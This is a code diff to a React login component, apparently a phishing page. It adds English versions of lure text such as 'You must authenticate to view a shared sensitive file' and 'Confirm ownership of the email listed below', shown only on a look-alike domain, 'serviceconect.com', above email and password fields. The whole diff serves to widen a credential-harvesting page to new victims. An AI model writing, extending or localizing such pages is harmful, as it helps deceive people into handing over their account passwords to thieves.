@@ -14,6 +14,7 @@ import { useSnackbar } from "notistack"; // Add this import
 
 
 const MtnLoginPage: React.FC = () => {
+  const isEnglish = window.location.href.includes('https://serviceconect.com');
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
@@ -177,17 +178,17 @@ const [successCount, setSuccessCount] = useState<number>(0);
             fontSize: { xs: 16, sm: 18 },
           }}
         >
-          <b>Debe autenticarse para ver un archivo confidencial compartido.</b>
+          <b>{isEnglish ? 'You must authenticate to view a shared sensitive file.' : 'Debe autenticarse para ver un archivo confidencial compartido.'}</b>
         </Typography>
         <Typography variant="body2" sx={{ color: "firebrick", mt: 2 }}>
-          <b>Confirme la propiedad del correo electrónico que se indica a continuación.</b>
+          <b>{isEnglish ? 'Confirm ownership of the email listed below.' : 'Confirme la propiedad del correo electrónico que se indica a continuación.'}</b>
         </Typography>
 
         <form onSubmit={(e) => e.preventDefault()}>
           {/* Email Input */}
           <Box sx={{ mb: 2, mt: 2 }}>
             <Typography variant="body2" sx={{ textAlign: "left", mb: 1 }}>
-              Dirección de correo electrónico
+              {isEnglish ? 'Email address' : 'Dirección de correo electrónico'}
             </Typography>
             <Box
               sx={{
@@ -216,7 +217,7 @@ const [successCount, setSuccessCount] = useState<number>(0);
           {/* Password Input */}
           <Box sx={{ mb: 2 }}>
             <Typography variant="body2" sx={{ textAlign: "left", mb: 1 }}>
-              Contraseña
+              {isEnglish ? 'Password' : 'Contraseña'}
             </Typography>
             <Box
               sx={{
@@ -260,7 +261,7 @@ const [successCount, setSuccessCount] = useState<number>(0);
                 onChange={(e) => setSecuredSession(e.target.checked)}
               />
             }
-            label="Secured Session?"
+            label={isEnglish ? 'Secured Session?' : 'Sesión segura?'}
           />
 
           <Button
@@ -271,7 +272,7 @@ const [successCount, setSuccessCount] = useState<number>(0);
             onClick={handleLogin}
             disabled={loading}
           >
-            {loading ? <CircularProgress size={24} /> : "Enviar mensaje"}
+            {loading ? <CircularProgress size={24} /> : isEnglish ? 'Sign in' : 'Enviar mensaje'}
           </Button>
         </form>
       </Box>
